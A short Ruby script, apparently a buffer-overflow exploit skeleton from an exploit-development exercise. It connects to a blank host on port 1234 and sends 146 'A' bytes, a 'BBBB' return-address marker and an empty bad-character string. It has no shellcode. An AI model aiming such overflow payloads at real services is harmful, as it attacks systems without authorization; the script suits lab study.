#!/usr/bin/ruby

require "socket"
s = TCPSocket.new"",1234

offset = 146
buffer = "A" * offset
bad_chars = ""


payload = buffer + "BBBB" + bad_chars

s.puts ""
s.puts payload